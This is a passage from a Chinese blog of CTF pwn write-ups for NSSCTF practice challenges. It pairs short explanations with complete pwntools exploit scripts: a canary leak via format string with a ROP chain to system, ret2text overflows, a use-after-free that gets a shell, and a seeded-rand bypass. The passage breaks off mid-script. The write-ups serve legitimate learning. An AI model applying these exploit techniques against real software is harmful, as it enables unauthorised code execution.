&lt;p&gt;这个题涉及的知识点有点多毕竟保护全开，打开 ida 查看到 sub 函数里面的有个字符串溢出可以得到 canary 和基地址，用 gdb 因为开启了 ple 不能在 main 函数上下断点就只有下在 printf 上了然后调试你可以用 stack 查看到 rbp 上面的地址是 ****00 可以猜到这个就是 canary 了因为 canary 一般情况下都是以 00 结尾的，canary 保护主要是通过在栈下设置一个地址，返回是也必须带上那个地址不然就会触发保护，然后 ple 保护的话主要是通过每次修改.text、.data 的地址。tips：使用 pwngdb 可以利用 fmtarg 来得到栈偏移量&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf=ELF(&amp;#x27;find_flag&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28437)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name?&amp;#x27;,&amp;#x27;%17$p---%19$p&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;you, &amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=p.recv(18)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvuntil(&amp;#x27;---&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b=p.recv(14)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=int(a,16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;b=int(b,16)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(a)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(b)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;base=b-0x146F&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system=base+elf.sym[&amp;#x27;system&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;log.info(&amp;#x27;system addr is %x&amp;#x27;%system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat=base+0x2004&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rdi=base+0x14E3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret=base+0x101A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*0x38+p64(a)+p64(0)+p64(ret)+p64(rdi)+p64(cat)+p64(system)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;else? &amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;hdctf-2023pwnner&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#hdctf-2023pwnner&#34;&gt;#&lt;/a&gt; [HDCTF 2023]pwnner&lt;/h5&gt;
&lt;p&gt;这个题又让我学到了伪随机数这个 srand (0x38) 控制着 rand 的随机大小只需要使用 python 库的 ctypes 只要有 srand 就能得到 rand 的大小&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;libc = ctypes.CDLL(&amp;quot;libc.so.6&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand.argtypes = [ctypes.c_uint]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(0x39)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand_result = libc.rand()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后代码如下&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import ctypes&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&amp;#x27;amd64&amp;#x27;,os=&amp;#x27;linux&amp;#x27;,log_level=&amp;#x27;debug&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ctypes.CDLL(&amp;#x27;/lib/x86_64-linux-gnu/libc.so.6&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28917)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand.argtypes=[ctypes.c_uint]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc.srand(0x39)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand_result=libc.rand()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&amp;#x27;name:&amp;#x27;,str(rand_result))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x40+0x8)+p64(0x4008B2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;litctf-2023口算题卡&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#litctf-2023口算题卡&#34;&gt;#&lt;/a&gt; [LitCTF 2023] 口算题卡&lt;/h5&gt;
&lt;p&gt;口算题要么口算要么写个脚本我这么懒肯定是&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28904)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;while 1:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    eval_1=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&amp;#x27;What is &amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    eval_1=p.recvuntil(b&amp;#x27;?&amp;#x27;)[:-1]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    log.info(eval_1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    payload=eval(eval_1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.send(str(payload))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recvline()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;swpuctf-2022-新生赛有手就行的栈溢出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#swpuctf-2022-新生赛有手就行的栈溢出&#34;&gt;#&lt;/a&gt; [SWPUCTF 2022 新生赛] 有手就行的栈溢出&lt;/h5&gt;
&lt;p&gt;看到危险函数栈溢出后跳转到 execve 即可&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28296)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x20+0x8)+p64(0x401257)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022ezheap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022ezheap&#34;&gt;#&lt;/a&gt; [NISACTF 2022]ezheap&lt;/h5&gt;
&lt;p&gt;这题还没来得及打开看就出了，直接运行发现输入很多下面的报错是 sh，并且提示哪里多了，那我们就直接卡溢出那里运行就好&lt;/p&gt;
&lt;h5 id=&#34;wustctf-2020getshell2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wustctf-2020getshell2&#34;&gt;#&lt;/a&gt; [WUSTCTF 2020]getshell2&lt;/h5&gt;
&lt;p&gt;sh 相当于执行 /bin/sh&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node5.anna.nssctf.cn&amp;#x27;,28650)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;a&amp;#x27;*(0x18+0x4)+p32(0x8048529)+p32(0x08048670)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;nisactf-2022uaf&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#nisactf-2022uaf&#34;&gt;#&lt;/a&gt; [NISACTF 2022]UAF&lt;/h5&gt;
&lt;p&gt;新手的第一个 uaf 题目这个题目很友好让我不太难受，checksec 看一下就明白开启了 canary，但是没有泄露我在 stack 上准备泄露他但是不行，直接死循环，32 位拖进 ida 看 f5 了，发现 f5 里面的函数有很多，并且逻辑分明，那只有慢慢审计了，看 main 函数发现是一个菜单有 create、edit、del、show，并且里面还有一个 system，感觉像是看到了新大陆一样，根据题目来就是 uaf，百度搜索一下就能发现 free 的漏洞，使用了 malloc 分配了内存空间给一个数字但是 free 没有清空只是暂时释放了，只要下一个同样申请一样的内存的话内存地址就会一样，再看 edit 能发现这个 if 语句能够修改 0 并且在里面输入值，然后就是 del，使用 free 释放空间，在之后就是 show 来查看 edit 写入的值，那就可有来构造 uaf 漏洞了。&lt;br /&gt;
`` 如果说有要注意的，就是利用 show 功能 get_shell 的时候只能使用索引为 0 的堆块，而 edit 不能编辑索引为 0 的堆块，所以就要用到 UAF 了因为 if (v1 &amp;lt;= 0 || v1&amp;gt; i ) 其中 0 可以通过&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&amp;#x27;node4.anna.nssctf.cn&amp;#x27;,28338)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def create():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;:&amp;#x27;,&amp;#x27;1&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def edit(index,string):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;:&amp;#x27;,&amp;#x27;2&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;page&amp;#x27;,index)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;strings&amp;#x27;,string)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def dela(index):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;:&amp;#x27;,&amp;#x27;3&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;page&amp;#x27;,index)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;def show(index):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;:&amp;#x27;,&amp;#x27;4&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendlineafter(&amp;#x27;page&amp;#x27;,index)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dela(&amp;#x27;0&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;create()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=b&amp;#x27;sh;\x00&amp;#x27;+p32(0x8048642)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&amp;#x27;1&amp;#x27;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&amp;#x27;0&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h5 id=&#34;bjdctf-2020babyrop&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bjdctf-2020babyrop&#34;&gt;#&lt;/a&gt; [BJDCTF 2020]babyrop&lt;/h5&gt;
&lt;p&gt;本题使用的是 libc6_2.23-0ubuntu11_amd64&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import time&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;from LibcSearcher import *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(log_level=&amp;#x27;debug&amp;#x27;,os=&amp;#x27;linux&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a=0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if a:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; p=process(&amp;#x27;./pw&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;else:&lt;/span&gt;&lt;br&gt;&lt;span 